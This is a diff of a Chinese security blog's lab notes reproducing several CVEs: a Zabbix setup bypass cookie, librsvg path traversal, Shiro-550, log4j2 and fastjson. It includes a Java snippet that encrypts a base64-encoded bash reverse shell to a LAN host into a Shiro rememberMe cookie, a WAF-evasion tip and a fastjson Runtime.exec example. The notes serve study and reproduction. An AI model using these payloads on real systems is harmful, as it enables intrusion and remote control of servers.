+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sessionid&quot;</span><span class="punctuation">:</span><span class="string">&quot;9ae18daaf9252e801f01423f09251df9&quot;</span><span class="punctuation">,</span><span class="attr">&quot;check_fields_result&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;step&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;default_lang&quot;</span><span class="punctuation">:</span><span class="string">&quot;en_GB&quot;</span><span class="punctuation">,</span><span class="attr">&quot;default_timezone&quot;</span><span class="punctuation">:</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="attr">&quot;default_theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;blue-theme&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sign&quot;</span><span class="punctuation">:</span><span class="string">&quot;93i9z+bSC4\/nvRzQeyOTYKTMZZvGJ0tI\/24B8gtR8g+o2zr+QAqwmaBkmoGbUWREjdMOqWNNINZ6s5qWX2\/pfRXGxvbDwrF0CIOuxAkKYrknHePM5+N+OEItngMC5nyZkM2iO3ZL4D1YWiiXt2JYHbjf9rGu51H65T1HliEMcDnjBCYLRj6xvUyWCRZSKqCPJXeO+7IM0ILKky8U3t+RRQyshjEQof5l+STNV+AN1Kw=&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>描述指向的是部分步骤的越权问题，这边调整step，看看后面步骤都是啥，能访问到6，但是会因为连接不到数据库又回到2，然后就卡住了</p>
+<p>看到个poc是<code>&#123;&quot;sessionid&quot;:&quot;INVALID&quot;,&quot;check_fields_result&quot;:true,&quot;step&quot;:6,&quot;serverCheckResult&quot;:true,&quot;serverCheckTime&quot;:1645123704,&quot;sign&quot;:&quot;INVALID&quot;&#125;</code>去base64后作为cookie，重新登陆就能在首页看到flag，不过没找到具体的构造原理，还是先分析漏洞再回过头来写吧</p>
+<h4 id="漏洞分析-TODO-1"><a href="#漏洞分析-TODO-1" class="headerlink" title="漏洞分析 TODO"></a>漏洞分析 TODO</h4><h3 id="CVE-2023-38633"><a href="#CVE-2023-38633" class="headerlink" title="CVE-2023-38633"></a><h3 id="CVE-2023-38633">CVE-2023-38633</h3></h3><blockquote>
+<p>一个在 librsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件（在预期区域之外的本地文件系统上），例如通过在 xi:include 元素中使用 href=”.?../../../../../../../../../../etc/passwd” 来读取结果。</p>
+</blockquote>
+<p>摸不着头脑，跟着CVE号一路往上摸，这个漏洞最后指向的是XXE漏洞</p>
+<h3 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a><h3 id="CVE-2014-3529">CVE-2014-3529</h3></h3><p>XXE漏洞</p>
 <h1 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a><h1 id="2">Vulhub</h1></h1><h2 id="Shiro-550-lt-h1-gt"><a href="#Shiro-550-lt-h1-gt" class="headerlink" title="Shiro 550&lt;/h1&gt;"></a><h2 id="shiro550">Shiro 550&lt;/h1&gt;</h2><p>shiro反序列化漏洞，CVE-2016-4437</p>
 <p><code>response</code>中若有<code>rememberMe=deleteMe</code>，则表示使用了shiro框架</p>
 <p>而bp的插件BurpShiroPassiveScan可以进行检测并报出漏洞</p>
@@ -431,7 +525,7 @@
 <p>生成rememberMe</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.crumbling;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE4OS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>将结果写入Cookie重放应该就能在监听的终端看到被攻击的shell然后进行各种命令行操作了，不过同一台虚拟机作为攻击和被攻击似乎不太好监听，重新摸索一下可能要。不过大致内容就是以上了。</p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>现实的漏洞挖掘场景，可能在key上出现问题，大致思路是字典爆破，不过更合适的应该是一些自动化的测试工具，应该要比自己人工爆破要快捷。</p>
+<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>现实的漏洞挖掘场景，可能在key上出现问题，大致思路是字典爆破，不过更合适的应该是一些自动化的测试工具，应该要比自己人工爆破要快捷。</p>
 <p>以及用于重定向的’&gt;’’&lt;’可能被各种waf啊hids这样的设备检测，可以尝试利用<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog (ares-x.com)</a>编码绕过一下</p>
 <h2 id="log4j2-lt-h1-gt"><a href="#log4j2-lt-h1-gt" class="headerlink" title="log4j2&lt;/h1&gt;"></a><h2 id="log4j2">log4j2&lt;/h1&gt;</h2><p>CVE-2021-44228</p>
 <p>log4j2是apache下的java应用常见开源日志库.JNDI，全称为Java命名和目录接口（Java Naming and Directory Interface）允许从指定的远程服务器获取并加载对象。相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
@@ -442,13 +536,18 @@
 <h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h2 id="fastjson反序列化漏洞-lt-h1-gt"><a href="#fastjson反序列化漏洞-lt-h1-gt" class="headerlink" title="fastjson反序列化漏洞&lt;/h1&gt;"></a><h2 id="fastjson">fastjson反序列化漏洞&lt;/h1&gt;</h2><p>fastjson是阿里开发的开源json解析库，主要作用是json字符串反序列化到JavaBean</p>
 <p>漏洞影响＜=1.2.48fastjson</p>
 <p>复现环境为1.2.27</p>
-<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>主要是<code>AutoType</code>导致的，而复现环境1.2.27版本在1.2.24后，<code>AutoType</code>已经被禁用，所以需要单独开启。</p>
+<h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>主要是<code>AutoType</code>导致的，而复现环境1.2.27版本在1.2.24后，<code>AutoType</code>已经被禁用，所以需要单独开启。</p>
 <p><code>@type</code>是<code>fastjson</code>中一个特殊注解，用于表示<code>json</code>字符串中某个属性是一个java对象的类型</p>
 <p>一段@type的使用案例</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13239046.html">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721） - Bypass - 博客园 (cnblogs.com)</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoyunxiaogang/p/17219281.html">Joomla未授权访问漏洞|CVE-2023-23752复现及修复 - 那酒不要留 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md">apisix/docs/zh/latest/plugins/batch-requests.md at ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c · apache/apisix (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S75GkwmsaTggBxcX05GY5Q">【技术干货】CVE-2022-24112 Apache APISIX 远程代码执行漏洞 (qq.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13239046.html">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721） - Bypass - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/380568.html">log4j2原理分析及漏洞复现- CVE-2021-44228 - FreeBuf网络安全行业门户</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/381092.html">java经典漏洞复现（基于vulhub） - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/27130.html">【最新漏洞预警】CVE-2022-23134 Zabbix漏洞分析之二：从未授权访问到接管后台 | CTF导航 (ctfiot.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/854192.html#google_vignette">Zabbix setup.php 访问权限控制不当漏洞(CVE-2022-23134) | CN-SEC 中文网</a></p>
 </h2></h2></h2>
         
       </div>
